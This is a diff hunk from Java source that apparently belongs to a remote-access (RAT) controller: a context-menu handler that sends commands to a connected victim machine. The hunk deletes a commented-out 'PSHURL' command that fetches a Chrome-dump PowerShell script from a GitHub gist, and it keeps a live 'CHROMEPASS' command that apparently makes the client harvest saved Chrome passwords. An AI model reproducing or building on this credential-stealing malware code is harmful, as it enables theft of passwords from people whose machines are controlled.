@@ -299,7 +299,6 @@ class IPContextMenu implements Repository {
                 }
                 try {
 
-                    //clientObject.clientCommunicate("PSHURL https://gist.github.com/cbrnrd/d7e9870549116ba2ccf1dab96c0b91d0/raw/d33c55e3c20c4505fa1666c9f64d581ee700fa29/Get-ChromeDump-CSV.ps1" );
                     clientObject.clientCommunicate("CHROMEPASS");
                     Stage stage = new Stage();
                     stage.initStyle(StageStyle.UNDECORATED);
